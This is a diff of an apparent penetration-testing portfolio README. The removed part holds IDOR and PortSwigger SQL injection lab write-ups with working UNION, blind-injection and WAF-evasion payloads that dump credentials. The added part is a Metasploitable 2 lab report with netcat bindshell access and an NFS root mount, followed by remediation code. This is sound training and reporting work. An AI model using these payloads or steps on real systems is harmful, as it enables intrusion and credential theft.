+### Virtual Machine Configuration Details:
+- **Hypervisor:** Oracle VM VirtualBox (v7.x)
+- **Virtual Network Adapter:** Host-Only Adapter (`vboxnet0`), promiscuous mode enabled for lab capture.
+- **Testing Node:** Kali Linux 64-bit (`eth0` bound to `192.168.56.x` subnet).
+- **Target Node:** Metasploitable 2 Linux 32-bit (`eth0: 192.168.56.103` on recreated environment; `192.168.56.102` during initial baseline enumeration).
 
 ---
 
-### Task 4: Common Web Vulnerabilities
+## 🎯 Scope, Boundaries & Methodology
 
-#### 4.1 Insecure Direct Object References (IDOR)
+### 1. Assessment Scope
+Testing was strictly confined to the virtual machine boundary of Metasploitable 2 on IP addresses `192.168.56.103` and `192.168.56.102`. All surrounding host OS services, gateway devices, and third-party systems were strictly out of scope.
 
-##### 📖 Scenario & Context
-Conducted on the *TryPresentMe* web application (TryHackMe Advent of Cyber 2025 Day 5). An investigation was launched into data leak reports, stolen gift vouchers, targeted phishing campaigns, and unauthorized account access by an attacker known as "Sir Carrotbane".
+### 2. Methodological Progression
+1. **Pre-Engagement & Setup:** Validate host-only isolation, confirm DHCP assignment on Kali Linux, verify non-routable communication.
+2. **Host Discovery & Availability:** ICMP echo testing (`ping -c 4`) and initial socket connectivity probing.
+3. **Comprehensive Port Scanning:** High-performance TCP SYN scan with service version intensity (`-sV`), default scripting engine checks (`-sC`), and OS fingerprinting (`-O`).
+4. **Service & Web Application Enumeration:**
+   - **File Sharing Services:** SMB share inspection (`smbclient`), protocol verification (SMBv1), NFS export interrogation (`showmount -e`).
+   - **Remote Shells & Access:** Telnet banner inspection, SSH legacy cipher negotiation, FTP anonymous login validation (vsftpd and ProFTPD).
+   - **Web Services & Application Endpoints:** Port 80 Apache HTTP enumeration, Gobuster directory discovery, PHPInfo parameter leakage, WebDAV HTTP method analysis (`OPTIONS`, `PROPFIND`), Tomcat 5.5 on port 8180, AJP13 connector on port 8009, and TWiki collaboration portal on `/twiki/`.
+5. **Vulnerability Validation:** Controlled verification of critical security weaknesses:
+   - Verification of the unauthenticated root bindshell on `TCP/1524` with Netcat and identity validation via `id`.
+   - Verification of the wildcard root export on `TCP/2049` via a client-side read-only NFS mount and verification of `/etc/hostname`.
+6. **Reporting & Remediation:** Mapping findings to risk ratings, documenting evidence integrity, and formulating a prioritized remediation roadmap.
+
+---
+
+## ⚙️ Phase 2 Execution Pipeline
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Attacker as Attacker (User ID 10)
-    participant Browser as Browser Storage
-    participant API as /api/view_accountinfo
-    participant DB as Backend Database
+    actor Tester as Penetration Tester (Kali Linux)
+    participant Net as Host-Only Network (192.168.56.0/24)
+    participant Target as Metasploitable 2 (192.168.56.103)
 
-    Attacker->>Browser: Inspect Local Storage ('auth_user')
-    Note over Browser: user_id: 10
-    Attacker->>Browser: Tamper user_id to 15
-    Browser->>API: GET /api/view_accountinfo (user_id=15)
-    Note over API: Flaw: Authenticated, but no Authorization Check!
-    API->>DB: SELECT * FROM accounts WHERE id = 15
-    DB-->>API: Returns Private Records of User 15
-    API-->>Attacker: Full Profile, Child Vouchers & PII Disclosed
+    Tester->>Target: ICMP Echo Request (Ping)
+    Target-->>Tester: 0% Packet Loss (Host Active)
+
+    Tester->>Target: Nmap Service & Version Scan (-sV -sC -p-)
+    Target-->>Tester: 23 Open TCP Ports Identified
+
+    Tester->>Target: Enumeration: SMB, NFS, FTP, WebDAV, Tomcat, TWiki
+    Target-->>Tester: Banners & Directories Disclosed (NFS / * exported)
+
+    Tester->>Target: Connect TCP/1524 (Netcat)
+    Target-->>Tester: Interactive Root Shell Prompt Granted!
+    Tester->>Target: Execute command 'id'
+    Target-->>Tester: uid=0(root) gid=0(root) groups=0(root)
+
+    Tester->>Target: Mount NFSv3 192.168.56.103:/ (Read-Only)
+    Target-->>Tester: Full Root Filesystem Mounted (/etc, /home, /root)
+    Tester->>Target: Read /etc/hostname
+    Target-->>Tester: "metasploitable"
 ```
 
-##### 🛠️ Methodology & Findings
-1. **Authentication vs. Authorization Breakdown:**
-   - Authenticated using legitimate credentials (`niels` / `TryHackMe#2025`).
-   - Identified background API request: `view_accountinfo` with query parameter `user_id=10`.
-2. **Client-Side State Tampering:**
-   - Navigated to Browser Developer Tools &rarr; **Storage Tab** &rarr; **Local Storage**.
-   - Located the `auth_user` object containing `"user_id": 10`.
-   - Manually altered `user_id` from `10` to `11`, refreshed the page, and observed immediate **Horizontal Privilege Escalation**, rendering another user's personal dashboard without authorization verification.
-   - Iterated parameter values to `user_id: 15`, uncovering the target parent profile managing 10 child accounts and recovering the compromised voucher records.
-3. **Cryptographic Identifier Analysis (UUIDv1 Flaw):**
-   - Investigated voucher code structures. Discovered that codes were generated using **UUID Version 1** (incorporating 60-bit timestamps and network MAC addresses).
-   - Demonstrated that sequential UUIDv1 values are mathematically predictable, allowing attackers to reconstruct active vouchers if creation timestamps are approximated.
+### 1. Lab Setup & Baseline Verification (`01_Lab_Setup`)
+- Deployed the Metasploitable 2 virtual machine disk image into Oracle VirtualBox.
+- Configured host-only virtual networking, assigning static MAC bindings to prevent inadvertent network bridging.
+- Verified target interface configurations using `ifconfig`, validating network parameters and confirming Kali Linux communication.
+- **Evidence Artifacts:** 5 screenshots in [`01_Lab_Setup`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/01_Lab_Setup>) (`Kali Linux Lab.png`, `Metasploitable 2 ifconfig.png`, `Metasploitable 2 Lab Installed .png`, `Metasploitable 2 Lab Setup.png`, `Metasploitable 2 Network Setting .png`).
 
-##### 📸 Key Practical Artifacts & Evidence
-- **Technical Report:** [IDOR Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/Room1_IDOR_Santa’s_Little_IDOR/IDOR - Santa’s Little IDOR Report.pdf>) &bull; [DOCX](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/Room1_IDOR_Santa’s_Little_IDOR/IDOR - Santa’s Little IDOR Report.docx>)
-- **Visual Evidence:** [Screenshot Directory](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/Room1_IDOR_Santa’s_Little_IDOR/Screenshot>) (`Complete .png`, `Complete All Task.png`, `complete Questions and Answer .png`)
+### 2. Reconnaissance & Host Discovery (`02_Reconnaissance`)
+- Verified round-trip connectivity via ICMP: `ping -c 4 192.168.56.103` returned `4 packets transmitted, 4 received, 0% packet loss`.
+- Executed full Nmap service detection:
+  ```bash
+  nmap -sV -sC -O -p- -T4 192.168.56.103 -oN nmap_full_service_scan.txt
+  ```
+- Evaluated HTTP port 80 web responses, uncovering default index directories, test suites, and diagnostic utilities.
+- Discovered `/phpinfo.php` returning full PHP 5.2.4 configuration directives, active modules, compile-time flags, and internal filesystem paths.
+- Analyzed phpMyAdmin on port 80, examining HTML comments and form attributes on the authentication endpoint.
+- **Evidence Artifacts:** 11 screenshots in [`02_Reconnaissance`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/02_Reconnaissance>) (`Nmap scan.png`, `Nmap_Service_Version_Scan.png`, `Target_Ping_Success.png`, `PHPInfo_Information_Disclosure.png`, `PhpMyAdmin_Login_Page.png`...).
+
+### 3. Deep Service & Protocol Enumeration (`03_Enumeration`)
+- Conducted deep, protocol-specific enumeration across 12 distinct functional service classes:
+  - **SMB & Samba:** Verified SMBv1 support via `smbclient -L //192.168.56.103 -N`. Verified read/write anonymous permissions on the `/tmp` share; verified permission denials on `/opt` and `/print$`.
+  - **NFS (Network File System):** Executed `showmount -e 192.168.56.103`, revealing an unrestricted root export (`/ *`).
+  - **FTP Servers:** Probed vsftpd 2.3.4 on TCP port 21 (anonymous login testing) and ProFTPD 1.3.1 on TCP port 2121.
+  - **Apache WebDAV:** Sent raw HTTP requests testing WebDAV verb capabilities. Target confirmed support for `OPTIONS`, `GET`, `HEAD`, `POST`, `PROPFIND`, and `PUT`.
+  - **Apache Tomcat:** Interrogated Tomcat 5.5 listening on TCP port 8180. Examined the administration interface (`/manager/html`), security headers, and tested default authentication vectors.
+  - **Apache Jserv Protocol (AJP):** Enumerated AJP13 on TCP port 8009, extracting connection parameters and header metadata.
+  - **TWiki Collaboration Portal:** Located TWiki application at `/twiki/bin/view/Main/WebHome`. Located public documentation files and `readme.txt` identifying `Version: 01 Feb 2003`.
+  - **SSH Service:** Audited OpenSSH 4.7p1 on port 22, identifying support for deprecated key-exchange algorithms and legacy ciphers.
+- **Evidence Artifacts:** 35 screenshots in [`03_Enumeration`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/03_Enumeration>) (`AJP_Service_Enumeration.png`, `FTP_Anonymous_Access_Test.png`, `NFS_Export_Enumeration.png`, `SMB_Enumeration.png`, `Tomcat_55_Default_Page.png`, `TWiki_Version_Identification.png`, `WebDAV_OPTIONS_Methods.png`...).
+
+### 4. Vulnerability Validation & Exploitation Proof (`04_Vulnerability_Validation`)
+- **Root Bindshell Exploitation:**
+  - Connected directly to TCP port 1524 using Netcat:
+    ```bash
+    nc -nv -w 3 192.168.56.103 1524
+    ```
+  - The service opened an unauthenticated interactive shell.
+  - Issued the identity command:
+    ```bash
+    id
+    ```
+  - **Terminal Output:**
+    ```text
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
+  - Terminated session cleanly with `exit`.
+- **NFS Root Export Mount Validation:**
+  - Created a local mount folder on Kali Linux: `mkdir -p /mnt/metasploitable-nfs`
+  - Mounted the target root filesystem using read-only client flags:
+    ```bash
+    mount -t nfs -o ro 192.168.56.103:/ /mnt/metasploitable-nfs
+    ```
+  - Browsed root directory structure: `bin`, `boot`, `dev`, `etc`, `home`, `initrd`, `lib`, `media`, `mnt`, `opt`, `proc`, `root`, `sbin`, `tmp`, `usr`, `var`.
+  - Verified target identification by reading `/mnt/metasploitable-nfs/etc/hostname`, returning `metasploitable`.
+- **Evidence Artifacts:** [`04_Vulnerability_Validation/Bindshell_Root_Access_Proof.png`](<./Kaustubh_Ashish_Bangar_WAPT_Phase-2/04_Vulnerability_Validation/Bindshell_Root_Access_Proof.png>).
 
 ---
 
-#### 4.2 Comprehensive SQL Injection (PortSwigger Academy)
+## 📊 23 Open TCP Ports Comprehensive Service Matrix
 
-##### 📖 Theoretical Framework & Vulnerability Taxonomy
-Structured Query Language (SQL) Injection consistently ranks as one of the most critical web application vulnerabilities under **OWASP Top 10 (A03:2021 – Injection)**. The flaw occurs when an application dynamically concatenates untrusted user input directly into SQL command strings without token separation:
+The following matrix documents the complete results of the Nmap TCP service and version interrogation conducted on the Metasploitable 2 target:
 
-$$\text{Query String} = \text{"SELECT } \text{cols} \text{ FROM } \text{table} \text{ WHERE } \text{param} = \text{'"} + \text{Input} + \text{"' AND status = 1"}$$
+| Port / Proto | State | Service Name | Daemon Version Detected | Attack Surface & Security Observations |
+| :---: | :---: | :--- | :--- | :--- |
+| **21/tcp** | Open | FTP | vsftpd 2.3.4 | Legacy FTP daemon; historical backdoor signature vector; supports anonymous login checks. |
+| **22/tcp** | Open | SSH | OpenSSH 4.7p1 Debian 8ubuntu1 | Outdated OpenSSH daemon; advertises legacy ciphers and deprecated key exchange algorithms. |
+| **23/tcp** | Open | Telnet | Linux telnetd | Unencrypted plaintext remote terminal protocol; susceptible to network sniffing. |
+| **25/tcp** | Open | SMTP | Postfix smtpd | Mail transfer agent; accepts plaintext SMTP commands; potential user enumeration vector (`VRFY`/`EXPN`). |
+| **53/tcp** | Open | DNS | ISC BIND 9.4.2 | Legacy nameserver daemon; zone transfer (`AXFR`) and caching vulnerability surface. |
+| **80/tcp** | Open | HTTP | Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4) | Primary web server; hosts WebDAV, phpMyAdmin, Mutillidae, DVWA, and PHPInfo disclosure. |
+| **111/tcp** | Open | RPC | rpcbind (2-4) | RPC portmapper; exposes registered RPC service numbers for NFS, mountd, and status daemons. |
+| **139/tcp** | Open | NetBIOS-SSN | Samba smbd 3.X - 4.X | NetBIOS session service; supports legacy SMBv1 negotiation; anonymous share enumeration. |
+| **445/tcp** | Open | Microsoft-DS | Samba smbd 3.X - 4.X | Direct-hosted SMB; allows anonymous null-session listing and world-writable `/tmp` access. |
+| **512/tcp** | Open | Exec | netexec | Legacy BSD r-command; remote execution daemon; vulnerable to IP-based trust exploitation (`.rhosts`). |
+| **513/tcp** | Open | Login | OpenBSD rlogind | Legacy remote login daemon; unencrypted plaintext session establishment. |
+| **514/tcp** | Open | Shell | cmd | Legacy remote shell service; executes commands without modern authentication tokens. |
+| **1099/tcp**| Open | Java RMI | GNU Classpath grmiregistry | Java Remote Method Invocation registry; potential deserialization attack surface. |
+| **1524/tcp**| Open | Ingreslock | **Metasploit Root Shell Backdoor** | **CRITICAL:** Spawns an immediate interactive root shell upon connection without authentication! |
+| **2049/tcp**| Open | NFS | NFSv2-4 (rpc.mountd) | **HIGH:** Exports entire root filesystem (`/ *`) to any remote client; allows unauthenticated read. |
+| **2121/tcp**| Open | FTP | ProFTPD 1.3.1 | Secondary FTP daemon; tested for anonymous authentication; rejected anonymous credentials. |
+| **3306/tcp**| Open | MySQL | MySQL 5.0.51a-3ubuntu5 | Relational database listener; unencrypted network authentication; default root credentials risk. |
+| **5432/tcp**| Open | PostgreSQL | PostgreSQL DB 8.3.0 - 8.3.7 | Relational database service; database manipulation and local file read/write risk. |
+| **5900/tcp**| Open | VNC | VNC protocol 3.3 | Virtual Network Computing desktop stream; susceptible to weak password cracking. |
+| **6000/tcp**| Open | X11 | X11 (access denied) | Network windowing system; checked for unauthorized display sniffing and keylogging. |
+| **6667/tcp**| Open | IRC | UnrealIRCd | Internet Relay Chat server; legacy version known for historical supply-chain backdoors. |
+| **8009/tcp**| Open | AJP13 | Apache Jserv Protocol v1.3 | Binary communication protocol connecting frontend Apache to backend Tomcat; Ghostcat risk surface. |
+| **8180/tcp**| Open | HTTP | Apache Tomcat/Coyote 1.1 (Tomcat 5.5) | Secondary web server; JSP engine; administrative manager endpoint (`/manager/html`). |
 
-When an attacker injects `' OR 1=1--`, the SQL lexer recognizes the single quote as a string terminator, the `OR` as a logical token, `1=1` as an immutable truth value, and `--` as a comment operator that discards all trailing application logic.
+---
 
-##### 🧪 Laboratory Case Studies & Solved Challenges (18 Completed Labs)
+## 🔍 Vulnerability Findings & Detailed Technical Analysis
 
 ```mermaid
 graph TD
-    SQLi[SQL Injection Mastery]
-    SQLi --> InBand[1. In-Band / Classical SQLi]
-    SQLi --> Union[2. UNION-Based Extraction]
-    SQLi --> Blind[3. Inferential / Blind SQLi]
-    SQLi --> Bypass[4. Perimeter Evasion]
+    Findings[VAPT Findings Hierarchy]
+    Findings --> Crit[Critical Findings]
+    Findings --> High[High Findings]
+    Findings --> Info[Informational & Attack Surface]
 
-    InBand --> L1[Lab 1: WHERE Clause Tautology]
-    InBand --> L2[Lab 2: Authentication Subversion]
-
-    Union --> L7[Lab 7: Column Count NULL Probing]
-    Union --> L8[Lab 8: Data Type Compatibility]
-    Union --> L34[Lab 3 & 4: Multi-Engine Version Banner]
-    Union --> L5[Lab 5: information_schema Tables & Columns]
-    Union --> L6[Lab 6: Oracle all_tables & all_tab_columns]
-    Union --> L9[Lab 9: Multi-Column Users Exfiltration]
-    Union --> L10[Lab 10: Single-Column Bottleneck Concatenation]
-
-    Blind --> L11[Lab 11: Blind Boolean TrackingId]
-    Blind --> L14[Lab 14: Blind Time-Delays pg_sleep 10s]
-
-    Bypass --> L18[Lab 18: WAF Evasion via XML Hex Entities]
+    Crit --> VAPT01[VAPT-01: TCP/1524 Root Bindshell Backdoor]
+    High --> VAPT02[VAPT-02: Wildcard NFS Root Export / *]
+    Info --> OBS01[OBS-01: Legacy Daemon Banners & Interfaces]
+    Info --> OBS02[OBS-02: TWiki Version & Documentation Leak]
 ```
 
-###### 1. In-Band & Authentication Subversion
-- **Lab 1 (WHERE Clause Unreleased Product Disclosure):**
-  - *Vector:* `GET /filter?category=Gifts' OR 1=1--`
-  - *Result:* Subverted `released = 1` condition, exposing unreleased and hidden products.
-- **Lab 2 (Authentication Logic Subversion):**
-  - *Vector:* `POST /login` with `username=administrator'--` and empty password.
-  - *Result:* Commented out `AND password = '...'` verification, authenticating directly into the `administrator` account.
+### VAPT-01 (Critical): Unauthenticated Root Shell via TCP/1524 Bindshell
 
-###### 2. UNION-Based Exploitation & Systematic Probing
-- **Lab 7 (Column Count Determination via Systematic NULL Probing):**
-  - Evaluated target column depth using `NULL` payloads (which cast transparently across types):
-    ```http
-    GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
-    ```
-  - Identified exactly 3 projected columns when HTTP 200 was achieved.
-- **Lab 8 (Determining Column Type Compatibility):**
-  - Sequentially tested which column accepted character string data:
-    ```http
-    GET /filter?category='+UNION+SELECT+NULL,'IYv5v5',NULL-- HTTP/1.1
-    ```
-  - Confirmed column 2 rendered strings, solving the lab.
-- **Lab 3 & Lab 4 (Querying Database Engine Types and Versions):**
-  - *Oracle Backend:* Queried dynamic performance view with mandatory dual table:
-    ```http
-    GET /filter?category=Lifestyle'+UNION+SELECT+banner,null+FROM+v$version-- HTTP/1.1
-    ```
-    *Extracted Banner:* `CORE 11.2.0.2.0 Production`.
-  - *MySQL / MSSQL Backend:* Queried global version variable:
-    ```http
-    GET /filter?category='+UNION+SELECT+@@version,null# HTTP/1.1
-    ```
+| Finding Attribute | Specification |
+| :--- | :--- |
+| **Vulnerability ID** | **VAPT-01** |
+| **Finding Title** | Unauthenticated Remote Root Command Execution via Exposed Bindshell |
+| **Assigned Severity** | **Critical** (CVSS:3.1 / AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H — Score: **10.0**) |
+| **Affected Asset** | `192.168.56.103:1524` (TCP) |
+| **Validation Status** | **Confirmed Exploited (UID 0 Verified)** |
+| **CWE Classification** | [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html) &bull; [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html) |
 
-###### 3. Database Schema Mapping & Cross-Table Exfiltration
-- **Lab 5 (Interrogating `information_schema` on Non-Oracle Systems):**
-  - Enumerated tables:
-    ```http
-    GET /filter?category='+UNION+SELECT+table_name,null+FROM+information_schema.tables-- HTTP/1.1
-    ```
-    *Discovered:* `users_gkrxdvf`.
-  - Enumerated columns:
-    ```http
-    GET /filter?category='+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users_gkrxdvf'-- HTTP/1.1
-    ```
-    *Discovered:* `username_qrqbxs`, `password_wzrkfa`.
-  - Dumped credentials:
-    ```http
-    GET /filter?category='+UNION+SELECT+username_qrqbxs,password_wzrkfa+FROM+users_gkrxdvf-- HTTP/1.1
-    ```
-- **Lab 6 (Interrogating Oracle Data Dictionary Views):**
-  - Enumerated tables via `all_tables`:
-    ```http
-    GET /filter?category='+UNION+SELECT+table_name,null+FROM+all_tables-- HTTP/1.1
-    ```
-    *Discovered:* `USERS_TPQMKX`.
-  - Enumerated columns via `all_tab_columns`:
-    ```http
-    GET /filter?category='+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name='USERS_TPQMKX'-- HTTP/1.1
-    ```
-    *Discovered:* `USERNAME_HSSGJU`, `PASSWORD_JFFHXZ`.
-  - Exfiltrated credentials from Oracle:
-    ```http
-    GET /filter?category='+UNION+SELECT+USERNAME_HSSGJU,PASSWORD_JFFHXZ+FROM+USERS_TPQMKX-- HTTP/1.1
-    ```
-- **Lab 9 (UNION Attack Retrieving Data from Other Tables):**
-  - Extracted `users` table records directly into projected columns.
-- **Lab 10 (Single-Column Bottleneck Concatenation):**
-  - Solved single-string-column limitation by concatenating fields:
-    ```http
-    GET /filter?category='+UNION+SELECT+null,username||'~'||password+FROM+users-- HTTP/1.1
-    ```
-    *Extracted:* `administrator~[PASSWORD]`.
+#### Vulnerability Description & Technical Root Cause
+TCP port 1524 (historically registered to the Ingreslock database lock manager) is configured on the target as an intentional root bindshell backdoor. A daemon listens continuously on this port; upon receiving an incoming TCP connection, it attaches standard input, standard output, and standard error directly to `/bin/sh` running with root privileges, requiring no username, password, or key-based authentication.
 
-###### 4. Advanced Inferential & Perimeter Evasion Techniques
-- **Lab 11 (Blind SQL Injection via Conditional Responses):**
-  - Injected boolean conditions into the `TrackingId` cookie, measuring character-by-character changes in response text.
-- **Lab 14 (Blind SQL Injection with Time Delays):**
-  - Injected PostgreSQL sleep primitive into `TrackingId` cookie:
-    ```http
-    GET / HTTP/2
-    Host: [TARGET].web-security-academy.net
-    Cookie: TrackingId=x'||pg_sleep(10)--; session=[SESSION_ID]
-    ```
-  - *Response Time:* **10,198 ms (~10.2 seconds)**, proving synchronous execution of blind database commands.
-- **Lab 18 (WAF Evasion via XML Hexadecimal Character Entity Encoding):**
-  - Target endpoint: `POST /product/stock` with XML payload:
-    ```xml
-    <stockCheck>
-      <productId>1</productId>
-      <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
-    </stockCheck>
-    ```
-  - *Result:* Signature-based WAF inspected raw string, failing to match `UNION SELECT`. The backend application decoded XML hexadecimal entities prior to executing SQL, successfully dumping administrator credentials.
+#### Proof of Concept (PoC) & Exploitation Mechanics
+From the Kali Linux testing machine, a direct socket connection was initiated via Netcat:
 
-##### 📸 Key Practical Artifacts & Evidence
-- **Technical Report:** [SQL Injection Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/SQL-Injection/SQL Injection Report.pdf>) &bull; [DOCX](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/SQL-Injection/SQL Injection Report.docx>)
-- **Visual Evidence (35 Solved Lab Screenshots):** [SQL-Injection Screenshots Directory](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/SQL-Injection/Screenshots>)
-
----
-
-## 🗃️ Multi-DBMS SQL Injection Dialect Matrix
-
-During professional testing, SQL payloads must strictly align with the syntactic grammar of the underlying RDBMS. Below is the multi-engine comparison matrix synthesized from the Phase 1 laboratory reports:
-
-| Feature / Capability | Oracle Database | Microsoft SQL Server (MSSQL) | MySQL Database | PostgreSQL Database |
-| :--- | :--- | :--- | :--- | :--- |
-| **Comment Terminator** | `--` | `--` | `#` or `-- ` *(space mandatory)* | `--` |
-| **String Concatenation** | `\|\|` *(double pipe)* | `+` *(plus operator)* | `CONCAT(a, b)` | `\|\|` *(double pipe)* |
-| **Mandatory FROM Clause** | **Yes** *(Must use `FROM dual`)* | **No** | **No** | **No** |
-| **Active Version Extraction** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT @@version` or `version()` | `SELECT version()` |
-| **System Metadata Tables** | `all_tables`, `all_tab_columns` | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
-| **Time-Delay Injection** | `dbms_pipe.receive_message()` | `WAITFOR DELAY '0:0:10'` | `SLEEP(10)` | `pg_sleep(10)` |
-| **Stacked Query Execution** | Restricted | Supported (`;`) | Supported (in specific drivers) | Supported (`;`) |
-
----
-
-## 🛡️ Defensive Engineering & Secure Coding Reference
-
-Remediating web application flaws requires addressing root causes rather than deploying cosmetic perimeter blocks. Below are verified implementation patterns across major languages:
-
-### 1. Parameterized Queries (Prepared Statements)
-
-Prepared statements fix the Abstract Syntax Tree (AST) at compilation time. User input is bound strictly as a literal value, completely neutralizing injection attempts regardless of quotes, semicolons, or comments.
-
-#### Java (JDBC `PreparedStatement`)
-```java
-// SECURE: Parameterized template fixes query grammar before input binding
-String query = "SELECT id, name, price FROM products WHERE category = ? AND released = 1";
-try (PreparedStatement pstmt = connection.prepareStatement(query)) {
-    pstmt.setString(1, userSuppliedCategory);
-    try (ResultSet rs = pstmt.executeQuery()) {
-        while (rs.next()) {
-            // Process record safely
-        }
-    }
-}
+```bash
+# Connect to target bindshell
+nc -nv -w 3 192.168.56.103 1524
 ```
 
-#### PHP (PDO Parameterization)
-```php
-// SECURE: Named parameter binding prevents SQL interpretation
-$stmt = $pdo->prepare('SELECT id, name, price FROM products WHERE category = :category AND released = 1');
-$stmt->execute(['category' => $userInputCategory]);
-$products = $stmt->fetchAll(PDO::FETCH_ASSOC);
+**Terminal Session Output:**
+```text
+(UNKNOWN) [192.168.56.103] 1524 (?) open
+root@metasploitable:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable:/# whoami
+root
+root@metasploitable:/# uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+root@metasploitable:/# exit
 ```
 
-#### Python (`psycopg2` / DB-API)
-```python
-# SECURE: Database adapter passes parameter tuple separately to SQL engine
-cursor.execute(
-    "SELECT id, name, price FROM products WHERE category = %s AND released = 1;",
-    (user_input_category,)
-)
-records = cursor.fetchall()
-```
+#### Security Impact Analysis
+An unauthenticated attacker located anywhere on the reachable network gains immediate, unrestricted root execution. Impact includes:
+- Complete loss of **Confidentiality:** Reading shadow hashes (`/etc/shadow`), database tables, and private keys.
+- Complete loss of **Integrity:** Modifying system binaries, trojanizing daemons, creating persistent backdoors.
+- Complete loss of **Availability:** Executing system shutdowns, deleting filesystems, or rendering services inoperable.
 
-#### C# (.NET `SqlCommand`)
-```csharp
-// SECURE: Strongly typed parameter assignment
-string query = "SELECT id, name, price FROM products WHERE category = @category AND released = 1";
-using (SqlCommand cmd = new SqlCommand(query, connection)) {
-    cmd.Parameters.Add("@category", SqlDbType.VarChar, 50).Value = userInputCategory;
-    using (SqlDataReader reader = cmd.ExecuteReader()) {
-        // Read data safely
-    }
-}
-```
-
----
-
-### 2. Defense-in-Depth Engineering Controls
-
-1. **Principle of Least Privilege (PoLP):** Web application database accounts must never run as `sa`, `root`, or `SYSDBA`. Application accounts must be revoked from querying `information_schema` or Oracle's `all_tables`.
-2. **Server-Side Allow-Listing for Dynamic SQL:** Column names and sort orders (`ORDER BY`) cannot be parameterized via prepared statements. Always enforce strict allow-lists:
-   ```java
-   List<String> allowedColumns = Arrays.asList("price", "rating", "date_added");
-   String sortColumn = allowedColumns.contains(userInputSort) ? userInputSort : "date_added";
-   String query = "SELECT * FROM products ORDER BY " + sortColumn;
+#### Remediation & Hardening Guidance
+1. **Immediate Action:** Terminate the rogue listening process and disable the service in `/etc/inetd.conf` or init scripts:
+   ```bash
+   # Identify and terminate process listening on 1524
+   fuser -k 1524/tcp
+   # Remove or comment out ingreslock entry in /etc/inetd.conf
+   sed -i '/ingreslock/s/^/#/' /etc/inetd.conf
+   /etc/init.d/openbsd-inetd restart
    ```
-3. **Disabling Verbose Error Messages:** Configure production servers to display generic 500 error pages to eliminate error-based schema disclosures.
-4. **Remediating IDOR (Secure Direct Object References - SDOR):**
-   - Never rely on client-supplied parameters (`user_id` in Local Storage) to retrieve private objects.
-   - Always derive the user context from cryptographically signed, server-side session tokens:
-     ```python
-     # SECURE: Object reference bound to validated session identity
-     @app.route('/api/view_accountinfo')
-     @login_required
-     def view_accountinfo():
-         user_id = session.get('user_id')  # Derived from server session, not client payload
-         account = db.query(Account).filter_by(id=user_id).first()
-         return jsonify(account.to_dict())
-     ```
+2. **Network Filtering:** Implement host-level iptables rules blocking unsolicited inbound traffic:
+   ```bash
+   iptables -A INPUT -p tcp --dport 1524 -j DROP
+   ```
 
 ---
 
-## 📁 Repository Architecture & Directory Hierarchy
+### VAPT-02 (High): Broad Wildcard NFS Export of Root Filesystem
+
+| Finding Attribute | Specification |
+| :--- | :--- |
+| **Vulnerability ID** | **VAPT-02** |
+| **Finding Title** | Excessive Information Disclosure via Wildcard NFS Root Filesystem Export |
+| **Assigned Severity** | **High** (CVSS:3.1 / AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:L / A:N — Score: **7.5**) |
+| **Affected Asset** | `192.168.56.103:2049` (NFS / `mountd`) |
+| **Validation Status** | **Confirmed (Read-Only Client Mount Verified)** |
+| **CWE Classification** | [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html) &bull; [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html) |
+
+#### Vulnerability Description & Technical Root Cause
+The Network File System (NFS) daemon on the target is misconfigured to export the entire root filesystem (`/`) with a wildcard client pattern (`*`) in `/etc/exports`. The export contains no IP address restrictions, CIDR boundaries, or subnet filtering, permitting any client on the network to attach to the export.
+
+#### Proof of Concept (PoC) & Exploitation Mechanics
+1. **Enumerating Remote NFS Exports:**
+   ```bash
+   showmount -e 192.168.56.103
+   ```
+   *Output:*
+   ```text
+   Export list for 192.168.56.103:
+   / *
+   ```
+2. **Mounting the Export Remotely:**
+   ```bash
+   mkdir -p /mnt/metasploitable-nfs
+   mount -t nfs -o ro,nolock 192.168.56.103:/ /mnt/metasploitable-nfs
+   ```
+3. **Validating Access & Extracting System Identity:**
+   ```bash
+   ls -la /mnt/metasploitable-nfs
+   cat /mnt/metasploitable-nfs/etc/hostname
+   ```
+   *Output:*
+   ```text
+   metasploitable
+   ```
+
+#### Security Impact Analysis
+While the client mount used the safe read-only (`ro`) switch, remote clients can inspect system-level configurations, read logs containing cleartext credentials, harvest user home directory files, and discover private SSH keys (`/root/.ssh/id_rsa`). If server-side permissions permit write access, an attacker could plant authorized SSH keys to gain shell access.
+
